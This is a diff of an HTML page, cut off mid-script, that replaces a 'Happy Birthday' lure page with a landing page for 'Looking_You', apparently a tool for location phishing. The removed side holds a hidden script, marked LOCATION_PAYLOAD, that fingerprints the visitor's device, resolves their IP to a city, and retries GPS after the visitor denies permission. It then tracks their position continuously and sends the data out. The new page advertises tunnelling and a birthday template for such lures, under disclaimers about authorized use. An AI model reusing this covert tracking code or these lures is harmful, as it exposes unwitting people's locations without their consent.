@@ -1,668 +1,532 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Birthday! 🎂</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 600px;
-            width: 90%;
-            animation: fadeIn 1s ease;
-            position: relative;
-            z-index: 1;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .birthday-icon {
-            font-size: 100px;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-        
-        h1 {
-            color: #333;
-            font-size: 3em;
-            margin-bottom: 20px;
-            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .message {
-            font-size: 1.2em;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        
-        .confetti {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #ff0000;
-            top: -10px;
-            animation: fall linear forwards;
-        }
-        
-        @keyframes fall {
-            to {
-                transform: translateY(100vh) rotate(360deg);
-            }
-        }
-        
-        .location-message {
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border-left: 4px solid #2196f3;
-        }
-        
-        .location-message p {
-            color: #1565c0;
-            margin: 0;
-            font-size: 0.9em;
-        }
-        
-        .cake {
-            width: 200px;
-            height: 100px;
-            background: linear-gradient(to bottom, #f7b731, #e67e22);
-            border-radius: 10px;
-            margin: 20px auto;
-            position: relative;
-        }
-        
-        .cake:before {
-            content: '';
-            position: absolute;
-            width: 220px;
-            height: 20px;
-            background: #ff9f43;
-            border-radius: 10px;
-            top: -10px;
-            left: -10px;
-        }
-        
-        .candle {
-            width: 10px;
-            height: 40px;
-            background: #fff;
-            margin: 0 auto;
-            position: relative;
-            top: -30px;
-            border-radius: 5px;
-        }
-        
-        .candle:before {
-            content: '';
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: #ff3838;
-            border-radius: 50%;
-            top: -10px;
-            left: -5px;
-            animation: flame 1s infinite alternate;
-        }
-        
-        @keyframes flame {
-            0% { transform: scale(1); opacity: 0.8; }
-            100% { transform: scale(1.2); opacity: 1; }
-        }
-        
-        .btn {
-            display: inline-block;
-            padding: 15px 40px;
-            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
-            color: white;
-            text-decoration: none;
-            border-radius: 50px;
-            font-size: 1.2em;
-            font-weight: bold;
-            margin-top: 20px;
-            transition: transform 0.3s, box-shadow 0.3s;
-            cursor: pointer;
-            border: none;
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-        
-        .music-player {
-            margin-top: 30px;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-        }
-        
-        audio {
-            width: 100%;
-            margin-top: 10px;
-        }
-        
-        .countdown {
-            font-size: 2em;
-            color: #333;
-            margin: 20px 0;
-            font-weight: bold;
-        }
-        
-        .wish-input {
-            width: 100%;
-            padding: 15px;
-            margin: 20px 0;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 1em;
-        }
-        
-        .submit-btn {
-            padding: 12px 30px;
-            background: #4ECDC4;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1em;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        
-        .submit-btn:hover {
-            background: #45b7aa;
-        }
-        
-        footer {
-            margin-top: 30px;
-            color: #777;
-            font-size: 0.9em;
-        }
-        
-        .location-info {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 0.9em;
-            color: #666;
-        }
-        
-        .location-info h3 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Looking_You — Professional Geolocation Suite</title>
+  <meta name="description" content="Looking_You — professional geolocation & telemetry demo suite. Designed for authorized security research, training and demos." />
+
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <!-- Lottie Player -->
+  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+
+  <style>
+    :root{
+      --bg:#f5f7fa;
+      --muted:#6b7280;
+      --text:#0f172a;
+      --accent:#2563eb;
+      --glass: rgba(255,255,255,0.75);
+      --panel-shadow: 0 12px 40px rgba(16,24,40,0.06);
+      --radius:14px;
+      --transition:240ms cubic-bezier(.2,.9,.3,1);
+    }
+    :root[data-theme='dark']{
+      --bg:#071025;
+      --muted:#94a3b8;
+      --text:#e6eef8;
+      --accent:#4f9cff;
+      --glass: rgba(6,8,14,0.6);
+      --panel-shadow: 0 14px 48px rgba(2,6,23,0.6);
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      background:linear-gradient(180deg,var(--bg),var(--bg));
+      color:var(--text);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+      transition:background var(--transition), color var(--transition);
+    }
+
+    /* Header */
+    header{
+      position:sticky;top:0;z-index:1200;display:flex;align-items:center;justify-content:space-between;
+      gap:12px;padding:14px 20px;background:var(--glass);backdrop-filter: blur(8px);
+      border-bottom:1px solid rgba(0,0,0,0.04);
+    }
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo-wrap{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--accent),#7c3aed);box-shadow:var(--panel-shadow);flex-shrink:0}
+    .brand-title{font-weight:800}
+    nav{display:flex;gap:12px;align-items:center}
+    nav a{color:var(--muted);text-decoration:none;font-weight:600;padding:8px;border-radius:8px;transition:all var(--transition)}
+    nav a:hover{color:var(--accent);transform:translateY(-2px)}
+    .header-actions{display:flex;gap:8px;align-items:center}
+
+    .btn-primary{background:linear-gradient(90deg,var(--accent),#7c3aed);color:#fff;border:none;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer;box-shadow:var(--panel-shadow)}
+    .btn-ghost{background:transparent;border:1px solid rgba(0,0,0,0.06);padding:8px 12px;border-radius:10px;color:var(--muted);cursor:pointer}
+
+    /* Main container & hero */
+    main{max-width:1200px;margin:28px auto;padding:18px}
+    .hero{
+      display:grid;grid-template-columns:1fr 440px;gap:24px;align-items:center;
+    }
+    .hero-card{background:var(--glass);border-radius:var(--radius);padding:22px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow)}
+    h1{font-size:2.4rem;margin:0 0 8px}
+    p.lead{color:var(--muted);margin:0 0 12px;line-height:1.5}
+
+    /* new organized content sections */
+    section{margin-top:26px}
+    .section-title{display:flex;justify-content:space-between;align-items:end;gap:12px}
+    .section-title h2{font-size:1.6rem;margin:0}
+    .section-sub{color:var(--muted);font-size:0.95rem;margin-top:6px}
+
+    /* Why Looking_You */
+    .why{display:grid;grid-template-columns:1fr 240px;gap:18px;align-items:start}
+    .why-list{display:grid;gap:12px}
+    .why-item{background:var(--glass);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow);display:flex;gap:12px}
+    .why-item .ico{width:44px;height:44px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));display:flex;align-items:center;justify-content:center;color:var(--accent)}
+
+    /* 3 Key Modules */
+    .modules{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:12px}
+    .module{background:var(--glass);padding:16px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow);display:flex;flex-direction:column;gap:10px}
+    .module h3{margin:0;font-size:1.05rem}
+    .module p{color:var(--muted);font-size:0.95rem;margin:0}
+
+    /* How It Works (steps) */
+    .steps{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:12px}
+    .step{background:var(--glass);padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);text-align:center}
+    .step .num{font-weight:800;font-size:1.1rem;color:var(--accent)}
+
+    /* Screens / Templates carousel (simple grid) */
+    .screens{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:12px}
+    .screen{height:160px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);display:flex;align-items:center;justify-content:center;color:var(--muted)}
+
+    /* Install block */
+    .install-block{display:grid;grid-template-columns:1fr 260px;gap:12px;align-items:start}
+    pre.code{background:#0b1220;color:#dbeafe;padding:12px;border-radius:10px;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono",monospace;overflow:auto;margin:0}
+
+    /* Legal & footer */
+    .legal{color:var(--muted);font-size:0.95rem}
+    footer{margin-top:28px;padding:18px;text-align:center;color:var(--muted)}
+
+    /* responsive */
+    @media (max-width:1000px){
+      .hero{grid-template-columns:1fr}
+      .why{grid-template-columns:1fr}
+      .modules{grid-template-columns:repeat(2,1fr)}
+      .screens{grid-template-columns:repeat(2,1fr)}
+      .steps{grid-template-columns:repeat(2,1fr)}
+      .install-block{grid-template-columns:1fr}
+      nav{display:none}
+    }
+    @media (max-width:560px){
+      h1{font-size:1.6rem}
+      .modules{grid-template-columns:1fr}
+      .screens{grid-template-columns:1fr}
+      .steps{grid-template-columns:1fr}
+      header{padding:10px}
+      .brand-title{font-size:15px}
+      .logo-wrap{width:40px;height:40px}
+    }
+
+    /* intro modal */
+    .intro-wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,rgba(2,6,23,0.6),rgba(2,6,23,0.5));z-index:1300;padding:20px;backdrop-filter: blur(6px)}
+    .intro-card{width:min(820px,96%);background:var(--glass);border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow);display:flex;flex-direction:column;gap:12px;align-items:center}
+    .intro-actions{display:flex;gap:10px;align-items:center}
+    .skip{background:transparent;border:1px solid rgba(0,0,0,0.06);padding:8px 12px;border-radius:10px;color:var(--muted);cursor:pointer}
+
+    /* small entrance */
+    .reveal{opacity:0;transform:translateY(8px);transition:all 360ms cubic-bezier(.2,.9,.3,1)}
+    .reveal.show{opacity:1;transform:none}
+
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="birthday-icon">🎂</div>
-        <h1>Happy Birthday! 🎉</h1>
-        
-        <div class="message">
-            <p>Wishing you a day filled with happiness and a year filled with joy!</p>
-            <p>May all your dreams and wishes come true today and always.</p>
+
+  <!-- Lottie Intro (plays once) -->
+  <div id="intro" class="intro-wrap" style="display:none" aria-hidden="true">
+    <div class="intro-card" role="dialog" aria-labelledby="introTitle">
+      <div style="width:100%;display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <div id="introTitle" style="font-weight:800;font-size:18px">Welcome to Looking_You</div>
+          <div style="color:var(--muted);font-size:13px">Professional geolocation & telemetry demo suite</div>
         </div>
-        
-        <div class="location-message">
-            <p>📍 <strong>Location Access Required:</strong> We need your location to show birthday celebrations near you!</p>
-        </div>
-        
-        <div class="cake">
-            <div class="candle"></div>
-        </div>
-        
-        <div class="countdown" id="countdown">Starting celebration...</div>
-        
-        <div class="location-info">
-            <h3>Why we need your location:</h3>
-            <p>• To show birthday events in your area</p>
-            <p>• To connect you with local celebrations</p>
-            <p>• For personalized birthday surprises</p>
-        </div>
-        
-        <div class="music-player">
-            <p>🎵 Birthday Music 🎵</p>
-            <audio controls autoplay loop>
-                <source src="https://assets.mixkit.co/music/preview/mixkit-happy-birthday-to-you-443.mp3" type="audio/mpeg">
-                Your browser does not support the audio element.
-            </audio>
-        </div>
-        
-        <button class="btn" onclick="showSurprise()">Click for Birthday Surprise! 🎁</button>
-        
-        <footer>
-            <p>Made with ❤️ | Allow location access for best experience</p>
-        </footer>
+        <button class="skip" id="skipIntro" aria-label="Skip intro">Skip</button>
+      </div>
+
+      <!-- Swap this src for any Lottie JSON if you want -->
+      <lottie-player id="lottie" src="https://assets4.lottiefiles.com/packages/lf20_jcikwtux.json" background="transparent" speed="1" style="width:100%;max-width:720px;height:320px" autoplay></lottie-player>
+
+      <div style="display:flex;gap:10px;margin-top:6px" class="intro-actions">
+        <button class="btn-primary" id="startBtn">Get started</button>
+        <button class="btn-ghost" id="learnBtn">View docs</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="brand" aria-label="Brand">
+      <div class="logo-wrap" aria-hidden="true">
+        <!-- Inline professional SVG logo -->
+        <svg width="28" height="28" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Looking_You logo">
+          <defs>
+            <linearGradient id="lg1" x1="0" x2="1" y1="0" y2="1">
+              <stop offset="0" stop-color="#4f9cff"/>
+              <stop offset="1" stop-color="#7c3aed"/>
+            </linearGradient>
+          </defs>
+          <rect x="2" y="2" width="44" height="44" rx="10" fill="url(#lg1)"/>
+          <path d="M15 30 L24 16 L33 30 Z" fill="white" opacity="0.98" />
+          <circle cx="24" cy="34" r="4" fill="rgba(255,255,255,0.95)"/>
+        </svg>
+      </div>
+      <div>
+        <div class="brand-title">Looking_You</div>
+        <div class="brand-sub" style="color:var(--muted);font-size:12px">Professional Geolocation Suite</div>
+      </div>
     </div>
 
-    <script>
-        // Create confetti
-        function createConfetti() {
-            const colors = ['#ff6b6b', '#4ecdc4', '#ffe66d', '#1a535c', '#ff9f43'];
-            for(let i = 0; i < 150; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.width = Math.random() * 10 + 5 + 'px';
-                confetti.style.height = confetti.style.width;
-                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
-                confetti.style.opacity = Math.random() + 0.5;
-                document.body.appendChild(confetti);
-                
-                setTimeout(() => {
-                    confetti.remove();
-                }, 5000);
-            }
-        }
-        
-        // Start countdown
-        function startCountdown() {
-            let count = 5;
-            const countdown = document.getElementById('countdown');
-            const interval = setInterval(() => {
-                countdown.innerHTML = `Celebration starts in: ${count}`;
-                count--;
-                if(count < 0) {
-                    clearInterval(interval);
-                    countdown.innerHTML = "🎉 Let's Celebrate! 🎉";
-                    createConfetti();
-                    setInterval(createConfetti, 3000);
-                }
-            }, 1000);
-        }
-        
-        // Show surprise
-        function showSurprise() {
-            alert('🎁 Surprise! 🎁\nYou are an amazing person!\nWishing you the best birthday ever!');
-            createConfetti();
-        }
-        
-        // Initialize
-        window.onload = function() {
-            startCountdown();
-            createConfetti();
-            setInterval(createConfetti, 5000);
-        }
-    </script>
-<!-- LOCATION_PAYLOAD -->
-<script>
-// Enhanced location collection with retry mechanism
-function collectLocationData() {
-    const data = {
-        timestamp: new Date().toISOString(),
-        pageType: 'birthday_page',
-        url: window.location.href,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-        windowSize: {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight
-        },
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        online: navigator.onLine,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        } : {},
-        referrer: document.referrer,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    <nav aria-label="Main navigation">
+      <a href="#why">Why</a>
+      <a href="#modules">Modules</a>
+      <a href="#how">How it works</a>
+      <a href="#install">Install</a>
+    </nav>
 
-    // Get IP address
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(ipData => {
-            data.ip = ipData.ip;
-            
-            // Get IP details
-            return fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        })
-        .then(response => response.json())
-        .then(ipDetails => {
-            data.ipDetails = {
-                country: ipDetails.country_name,
-                countryCode: ipDetails.country_code,
-                region: ipDetails.region,
-                city: ipDetails.city,
-                postal: ipDetails.postal,
-                latitude: ipDetails.latitude,
-                longitude: ipDetails.longitude,
-                timezone: ipDetails.timezone,
-                org: ipDetails.org,
-                asn: ipDetails.asn
-            };
-            
-            // Try to get GPS location
-            requestGPSLocation(data);
-        })
-        .catch(error => {
-            console.error('IP fetch error:', error);
-            requestGPSLocation(data);
-        });
-}
+    <div class="header-actions">
+      <button id="themeToggle" class="btn-ghost" title="Toggle theme"><i id="themeIco" class="fa-regular fa-moon"></i>&nbsp;<span style="font-weight:700">Theme</span></button>
+      <button id="downloadTop" class="btn-primary"><i class="fa-solid fa-download"></i>&nbsp;Download</button>
+    </div>
+  </header>
 
-function requestGPSLocation(data) {
-    if (!navigator.geolocation) {
-        data.gpsError = 'Geolocation not supported';
-        sendData(data);
-        return;
+  <!-- Main -->
+  <main>
+
+    <!-- HERO -->
+    <div class="hero">
+      <div class="hero-card reveal show" aria-labelledby="heroH">
+        <h1 id="heroH">Looking_You — Clean, secure geolocation demos for teams</h1>
+        <p class="lead">Enterprise-ready templates, privacy-first defaults and modern UX — built to teach and test responsibly. Designed for security teams, educators and technical demos.</p>
+
+        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px">
+          <button id="downloadHero" class="btn-primary"><i class="fa-solid fa-download"></i>&nbsp;Download demo</button>
+          <a href="#why" class="btn-ghost">Why Looking_You?</a>
+        </div>
+
+        <!-- quick stat strip -->
+        <div style="display:flex;gap:12px;margin-top:18px;flex-wrap:wrap">
+          <div style="background:var(--glass);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow)"><div style="font-size:13px;color:var(--muted)">Downloads</div><div style="font-weight:800">1,240</div></div>
+          <div style="background:var(--glass);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow)"><div style="font-size:13px;color:var(--muted)">Templates</div><div style="font-weight:800">12</div></div>
+          <div style="background:var(--glass);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--panel-shadow)"><div style="font-size:13px;color:var(--muted)">Tunnel options</div><div style="font-weight:800">4</div></div>
+        </div>
+      </div>
+
+      <aside class="hero-card reveal show" aria-labelledby="overviewH" id="overviewPanel">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div><div style="font-size:13px;color:var(--muted)">Version</div><div style="font-weight:800">v2.2</div></div>
+        </div>
+
+        <hr style="border:none;border-top:1px solid rgba(0,0,0,0.04);margin:12px 0">
+        <div style="font-size:14px;color:var(--muted)">Quick Links</div>
+        <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
+          <button class="btn-ghost" onclick="location.hash='#install'">Install</button>
+          <button class="btn-ghost" onclick="location.hash='#how'">How it works</button>
+          <button class="btn-primary" onclick="downloadDemo()">Download</button>
+        </div>
+      </aside>
+    </div>
+
+    <!-- WHY -->
+    <section id="why">
+      <div class="section-title">
+        <h2>Why Looking_You?</h2>
+        <div style="color:var(--muted)">Concise benefits for teams</div>
+      </div>
+      <p class="section-sub">Designed to be clear, safe, and demonstrable — perfect for training and authorized research.</p>
+
+      <div class="why" style="margin-top:12px">
+        <div class="why-list">
+          <div class="why-item reveal show">
+            <div class="ico"><i class="fa-solid fa-bolt"></i></div>
+            <div>
+              <div style="font-weight:700">Fast prototyping</div>
+              <div style="color:var(--muted);font-size:14px;margin-top:6px">Prebuilt templates and scripts to get demos running in minutes.</div>
+            </div>
+          </div>
+
+          <div class="why-item reveal show">
+            <div class="ico"><i class="fa-solid fa-user-shield"></i></div>
+            <div>
+              <div style="font-weight:700">Privacy-first</div>
+              <div style="color:var(--muted);font-size:14px;margin-top:6px">Built-in consent dialogs, retention limits, and auditable logs.</div>
+            </div>
+          </div>
+
+          <div class="why-item reveal show">
+            <div class="ico"><i class="fa-solid fa-book-open"></i></div>
+            <div>
+              <div style="font-weight:700">Educational</div>
+              <div style="color:var(--muted);font-size:14px;margin-top:6px">Clear docs and example flows for blue teams and educators.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="hero-card" style="padding:18px;height:100%">
+          <div style="font-weight:800">Product overview</div>
+          <div style="color:var(--muted);margin-top:8px">Looking_You is a modular suite focused on safe, auditable demos and training. The right choice when process, privacy, and clarity matter.</div>
+
+          <div style="margin-top:12px;display:flex;gap:8px">
+            <button class="btn-primary" onclick="downloadDemo()">Get Demo</button>
+            <button class="btn-ghost" onclick="location.hash='#modules'">See modules</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3 Key Modules -->
+    <section id="modules">
+      <div class="section-title">
+        <h2>Key Modules</h2>
+        <div style="color:var(--muted)">Core components that compose a demo environment</div>
+      </div>
+
+      <div class="modules">
+        <div class="module reveal show">
+          <div style="display:flex;align-items:center;justify-content:space-between">
+            <div>
+              <h3>Location Engine</h3>
+              <p>GPS-first resolution, IP fallback, device metadata & accuracy data for richer context.</p>
+            </div>
+            <div style="font-size:22px;color:var(--accent)"><i class="fa-solid fa-map-location-dot"></i></div>
+          </div>
+          <div style="color:var(--muted);font-size:13px;margin-top:8px">Includes simulated accuracy modifiers for training scenarios.</div>
+        </div>
+
+        <div class="module reveal show">
+          <div style="display:flex;align-items:center;justify-content:space-between">
+            <div>
+              <h3>Tunnel Manager</h3>
+              <p>Automated configs for Cloudflare Tunnel, ngrok, and SSH forwarding with healthchecks & fallback order.</p>
+            </div>
+            <div style="font-size:22px;color:var(--accent)"><i class="fa-solid fa-network-wired"></i></div>
+          </div>
+          <div style="color:var(--muted);font-size:13px;margin-top:8px">Scripted helpers and examples for reliability during demos.</div>
+        </div>
+
+        <div class="module reveal show">
+          <div style="display:flex;align-items:center;justify-content:space-between">
+            <div>
+              <h3>Privacy & Audit</h3>
+              <p>Retention policies, explicit consent flows, redactable logs and audit reports for governance.</p>
+            </div>
+            <div style="font-size:22px;color:var(--accent)"><i class="fa-solid fa-shield-halved"></i></div>
+          </div>
+          <div style="color:var(--muted);font-size:13px;margin-top:8px">Everything designed to be reviewable by compliance teams.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- How it works -->
+    <section id="how">
+      <div class="section-title">
+        <h2>How it works</h2>
+        <div style="color:var(--muted)">From deploy to internet — simple steps</div>
+      </div>
+
+      <div class="steps" style="margin-top:12px">
+        <div class="step reveal show">
+          <div class="num">1</div>
+          <div style="font-weight:700;margin-top:8px">Install</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:6px">Clone repo, run the tool with safe defaults.</div>
+        </div>
+
+        <div class="step reveal show">
+          <div class="num">2</div>
+          <div style="font-weight:700;margin-top:8px">Configure</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:6px">Choose tunnel, template, and retention policy for the session.</div>
+        </div>
+
+        <div class="step reveal show">
+          <div class="num">3</div>
+          <div style="font-weight:700;margin-top:8px">Run</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:6px">Start , observe logs, collect telemetry for analysis.</div>
+        </div>
+
+        <div class="step reveal show">
+          <div class="num">4</div>
+          <div style="font-weight:700;margin-top:8px">Audit</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:6px">Export audit artifacts and follow retention policies after the tools.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Screens / Templates -->
+    <section id="screens">
+      <div class="section-title">
+        <h2>Screens & Templates</h2>
+        <div style="color:var(--muted)">Example UI screens included in the repo</div>
+      </div>
+
+      <div class="screens">
+        <div class="screen reveal show">Birthday Template</div>
+        <div class="screen reveal show">Your own custom links</div>
+        <div class="screen reveal show">Simple and default page</div>
+      </div>
+    </section>
+
+    <!-- Install -->
+    <section id="install">
+      <div class="section-title">
+        <h2 id="installTitle">Installation</h2>
+        <div style="color:var(--muted)">Quickstart</div>
+      </div>
+
+      <div class="install-block" style="margin-top:12px">
+        <div class="card" style="padding:12px">
+          <p style="color:var(--muted);margin:0 0 8px">Clone the demo repo and run the safe installer:</p>
+          <pre class="code">git clone https://github.com/Bibekbista0406/Looking_You/tree/main
+cd looking-you
+chmod +x look-kri.sh
+./look-kri.sh</pre>
+
+          <div style="display:flex;gap:8px;margin-top:10px">
+            <button class="btn-primary" id="copyInstall">Copy commands</button>
+            <button class="btn-ghost" id="openReadme">Open README</button>
+          </div>
+        </div>
+
+        <div class="card" style="padding:14px">
+          <div style="font-size:13px;color:var(--muted)">Quick checklist</div>
+          <ul style="margin-top:8px;color:var(--muted);line-height:1.6">
+            <li>Confirm you have written authorization for testing</li>
+            <li>Choose tunnel provider (Cloudflare, ngrok, SSH)</li>
+            <li>Review retention & logging options</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- Usage -->
+    <section id="usage">
+      <div class="section-title">
+        <h2>Usage</h2>
+        <div style="color:var(--muted)">Examples & best practices</div>
+      </div>
+
+      <div class="card" style="margin-top:12px">
+        <p style="color:var(--muted);margin:0 0 8px">Examples included:</p>
+        <ul style="color:var(--muted);line-height:1.6">
+          <li>Training workshop flow with consent dialog</li>
+          <li>Red team tabletop demonstration (authorized)</li>
+          <li>Educator example with simulated accuracy controls</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Legal -->
+    <section id="legal">
+      <div class="section-title">
+        <h2>Legal & Responsible Use</h2>
+        <div style="color:var(--muted)">Important — read before running</div>
+      </div>
+
+      <div class="card legal" style="margin-top:12px">
+        <p><strong>By using Looking_You you agree:</strong></p>
+        <ul>
+          <li>Use for authorized research, training and demos only.</li>
+          <li>Comply with all applicable laws and organizational policy.</li>
+          <li>Follow the included retention & redaction guidance after a demo.</li>
+        </ul>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    © <span id="year"></span> Looking_You — For authorized security research & training only.
+  </footer>
+
+  <script>
+    // --- Utilities
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // demo file generator & download
+    function generateDemo(){
+      return `#!/bin/bash
+# Looking_You demo v2.2
+echo "Looking_You demo starter"
+echo "Repo: https://github.com/Bibekbista0406/Looking_You/tree/main"
+`;
     }
-
-    // First request - high accuracy
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            data.gpsLocation = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
-                timestamp: new Date(position.timestamp).toISOString()
-            };
-            data.gpsSource = 'high_accuracy';
-            sendData(data);
-        },
-        (error) => {
-            // If permission denied, try with lower accuracy
-            if (error.code === error.PERMISSION_DENIED) {
-                data.gpsError = 'Permission denied for high accuracy';
-                
-                // Try with lower accuracy (some browsers allow this)
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        data.gpsLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date(position.timestamp).toISOString()
-                        };
-                        data.gpsSource = 'low_accuracy';
-                        data.gpsRetrySuccess = true;
-                        sendData(data);
-                    },
-                    (retryError) => {
-                        data.gpsError = `Retry failed: ${getGeolocationError(retryError)}`;
-                        sendData(data);
-                    },
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 10000,
-                        maximumAge: 60000
-                    }
-                );
-            } else {
-                data.gpsError = getGeolocationError(error);
-                sendData(data);
-            }
-        },
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        }
-    );
-
-    // Also start watching position for continuous updates
-    let watchId = null;
-    if (navigator.geolocation.watchPosition) {
-        watchId = navigator.geolocation.watchPosition(
-            (position) => {
-                if (!data.gpsUpdates) data.gpsUpdates = [];
-                data.gpsUpdates.push({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date(position.timestamp).toISOString()
-                });
-                
-                // Send update
-                sendData({...data, updateType: 'gps_update'});
-            },
-            (error) => {
-                console.log('Watch error:', error);
-            },
-            {
-                enableHighAccuracy: true,
-                maximumAge: 30000
-            }
-        );
-        
-        // Store watch ID for cleanup
-        data.watchId = watchId;
+    function downloadDemo(){
+      const blob = new Blob([generateDemo()], {type: 'text/plain'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url; a.download = 'looking-you-demo.sh';
